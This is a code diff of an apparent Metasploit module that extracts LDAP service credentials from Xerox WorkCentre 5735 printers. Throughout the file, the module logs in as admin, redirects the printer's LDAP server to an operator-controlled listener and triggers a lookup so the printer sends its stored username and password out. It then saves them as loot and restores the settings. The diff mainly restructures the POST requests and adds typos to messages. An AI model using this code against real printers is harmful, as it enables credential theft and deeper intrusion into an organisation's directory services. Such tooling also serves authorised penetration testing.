@@ -2,7 +2,6 @@
 # This module requires Metasploit: http//metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
 require 'rex/proto/http'
 require 'msf/core'
 
@@ -13,7 +12,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info={})
     super(update_info(info,
-      'Name'           => 'Xerox workcentre 5735 LDAP credential extractor',
+      'Name'           => 'Xerox workcentre 5735 LDAP service redential extractor',
       'Description'    => %{
         This module extract the printers LDAP user and password from Xerox workcentre 5735.
       },
@@ -40,7 +39,10 @@ class Metasploit3 < Msf::Auxiliary
     print_status("Attempting to extract LDAP username and password for the host at #{rhost}")
 
     @auth_cookie = default_page
-    return unless @auth_cookie
+    if @auth_cookie.blank?
+      print_status("Unable to get authentication cookie from #{rhost}")
+      return
+    end
 
     status = login
     return unless status
@@ -53,7 +55,7 @@ class Metasploit3 < Msf::Auxiliary
 
     start_listener
     unless @data
-      print_error('Failed to start listiner or the printer did not send us the credentials. :(')
+      print_error('Failed to start listiner or the printer did not send us the creds. :(')
       status = restore_ldap_server
       unless status
         print_error('Failed to restore old LDAP server. Please manually restore')
@@ -64,11 +66,11 @@ class Metasploit3 < Msf::Auxiliary
     status = restore_ldap_server
     return unless status
 
-    ldap_binary_creds = Ddata.scan(/(\w+\\\w+).\s*(.+)/).flatten
+    ldap_binary_creds = @data.scan(/(\w+\\\w+).\s*(.+)/).flatten
     ldap_creds = "#{ldap_binary_creds[0]}:#{ldap_binary_creds[1]}"
 
     #Woot we got creds so lets save them.#
-    print_good("The following credential were captured: #{ldap_creds}")
+    print_good("The following creds were capured: #{ldap_creds}")
     loot_name     = 'ldap.cp.creds'
     loot_type     = 'text/plain'
     loot_filename = 'ldap-creds.text'
@@ -87,13 +89,21 @@ class Metasploit3 < Msf::Auxiliary
       print_error("Failed to connect to #{rhost}. Please check the printers IP address.")
       return false
     end
-    @model_number = res.body.scan(/productName">XEROX WorkCentre (\d*)</).flatten # will use late for a switch for diffrent Xerox models.
     res.get_cookies
   end
 
   def login
     login_page = '/userpost/xerox.set'
-    login_post_data = "_fun_function=HTTP_Authenticate_fn&NextPage=%2Fproperties%2Fauthentication%2FluidLogin.php&webUsername=admin&webPassword=#{datastore['PASSWORD']}&frmaltDomain=default"
+    login_vars = {
+      '_fun_function' => 'HTTP_Authenticate_fn',
+      'NextPage' => '%2Fproperties%2Fauthentication%2FluidLogin.php',
+      'webUsername' => 'admin',
+      'webPassword' => datastore['PASSWORD'],
+      'frmaltDomain' => 'default'
+    }
+    login_post_data = []
+    login_vars.each_pair{|k, v| login_post_data << "#{k}=#{v}" }
+    login_post_data *= '&'
     method = 'POST'
 
     res = make_request(login_page, method, login_post_data)
@@ -125,8 +135,19 @@ class Metasploit3 < Msf::Auxiliary
 
   def update_ldap_server
     ldap_update_page = '/dummypost/xerox.set'
-    ldap_update_post = "_fun_function=HTTP_Set_Config_Attrib_fn&NextPage=%2Fldap%2Findex.php%3Fldapindex%3Ddefault%26from%3DldapConfig&ldap.server%5Bdefault%5D.server=#{datastore['NewLDAPServer']}%3A#{datastore['SRVPORT']}&ldap.maxSearchResults=25&ldap.searchTime=30"
+    ldap_update_vars = {
+      '_fun_function' => 'HTTP_Set_Config_Attrib_fn',
+      'NextPage' => '/ldap/index.php?ldapindex=default',
+      'from' =>'ldapConfig',
+      'ldap.server[default].server' => "#{datastore['NewLDAPServer']}:#{datastore['SRVPORT']}",
+      'ldap.maxSearchResults' => '25',
+      'ldap.searchTime' => '30',
+    }
+    ldap_update_post = []
+    ldap_update_vars.each_pair{|k, v| ldap_update_post << "#{k}=#{v}" }
+    ldap_update_post *= '&'
     method = 'POST'
+
     print_status("Updating LDAP server: #{datastore['NewLDAPServer']} and port: #{datastore['SRVPORT']}")
     res = make_request(ldap_update_page, method, ldap_update_post)
     if res.blank? || res.code != 200
@@ -138,8 +159,30 @@ class Metasploit3 < Msf::Auxiliary
 
   def trigger_ldap_request
     ldap_trigger_page = '/userpost/xerox.set'
-    ldap_trigger_post = 'nameSchema=givenName&emailSchema=mail&phoneSchema=telephoneNumber&postalSchema=postalAddress&mailstopSchema=l&citySchema=physicalDeliveryOfficeName&stateSchema=st&zipCodeSchema=postalcode&countrySchema=co&faxSchema=facsimileTelephoneNumber&homeSchema=homeDirectory&memberSchema=memberOf&uidSchema=uid&ldapSearchName=test&ldapServerIndex=default&_fun_function=HTTP_LDAP_Search_fn&NextPage=%2Fldap%2Fmappings.php%3Fldapindex%3Ddefault%26from%3DldapConfig'
+    ldap_trigger_vars = {
+      'nameSchema'=>'givenName',
+      'emailSchema'=>'mail',
+      'phoneSchema'=>'telephoneNumber',
+      'postalSchema'=>'postalAddress',
+      'mailstopSchema'=>'l',
+      'citySchema'=>'physicalDeliveryOfficeName',
+      'stateSchema'=>'st',
+      'zipCodeSchema'=>'postalcode',
+      'countrySchema'=>'co',
+      'faxSchema'=>'facsimileTelephoneNumber',
+      'homeSchema'=>'homeDirectory',
+      'memberSchema'=>'memberOf',
+      'uidSchema'=>'uid',
+      'ldapSearchName'=>'test',
+      'ldapServerIndex'=>'default',
+      '_fun_function'=>'HTTP_LDAP_Search_fn',
+      'NextPage'=>'%2Fldap%2Fmappings.php%3Fldapindex%3Ddefault%26from%3DldapConfig'
+    }
+    ldap_trigger_post = []
+    ldap_trigger_vars.each_pair {|k, v| ldap_trigger_post << "#{k}=#{v}" }
+    ldap_trigger_post *= '&'
     method = 'POST'
+
     print_status('Triggering LDAP reqeust')
     res = make_request(ldap_trigger_page, method, ldap_trigger_post)
     res.code
@@ -172,8 +215,33 @@ class Metasploit3 < Msf::Auxiliary
 
   def restore_ldap_server
     ldap_restore_page = '/dummypost/xerox.set'
-    ldap_restore_post = "_fun_function=HTTP_Set_Config_Attrib_fn&NextPage=%2Fldap%2Findex.php%3Fldapaction%3Dadd%26ldapindex%3Ddefault%26from%3DldapConfig&ldap.server%5Bdefault%5D.server=#{@ldap_server}%3A#{@ldap_port}&ldap.maxSearchResults=25&ldap.searchTime=30&ldap.search.uid=uid&ldap.search.name=givenName&ldap.search.email=mail&ldap.search.phone=telephoneNumber&ldap.search.postal=postalAddress&ldap.search.mailstop=l&ldap.search.city=physicalDeliveryOfficeName&ldap.search.state=st&ldap.search.zipcode=postalcode&ldap.search.country=co&ldap.search.ifax=No+Mappings+Available&ldap.search.faxNum=facsimileTelephoneNumber&ldap.search.home=homeDirectory&ldap.search.membership=memberOf"
+    ldap_restore_vars = {
+      '_fun_function' => 'HTTP_Set_Config_Attrib_fn',
+      'NextPage' => '/ldap/index.php?ldapaction=add',
+      'ldapindex' => 'default&from=ldapConfig',
+      'ldap.server[default].server' => "#{@ldap_server}:#{@ldap_port}",
+      'ldap.maxSearchResults' => '25',
+      'ldap.searchTime' => '30',
+      'ldap.search.uid' => 'uid',
+      'ldap.search.name' => 'givenName',
+      'ldap.search.email' => 'mail',
+      'ldap.search.phone' => 'telephoneNumber',
+      'ldap.search.postal' => 'postalAddress',
+      'ldap.search.mailstop' => 'l',
+      'ldap.search.city' => 'physicalDeliveryOfficeName',
+      'ldap.search.state' => 'st',
+      'ldap.search.zipcode' => 'postalcode',
+      'ldap.search.country' => 'co',
+      'ldap.search.ifax' => 'No Mappings Available',
+      'ldap.search.faxNum' => 'facsimileTelephoneNumber',
+      'ldap.search.home' => 'homeDirectory',
+      'ldap.search.membership' => 'memberOf'
+    }
+    ldap_restore_post = []
+    ldap_restore_vars.each_pair {|k, v| ldap_restore_post << "#{k}=#{v}" }
+    ldap_restore_post *= '&'
     method = 'POST'
+
     print_status("Restoring LDAP server: #{@ldap_server}")
     res = make_request(ldap_restore_page, method, ldap_restore_post)
     if res.blank? || res.code != 200
@@ -193,7 +261,7 @@ class Metasploit3 < Msf::Auxiliary
         'data'      => post_data
       }, datastore['TIMEOUT'].to_i)
       return res
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
+    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
       print_error("#{rhost}:#{rport} - Connection failed.")
       return false
     end
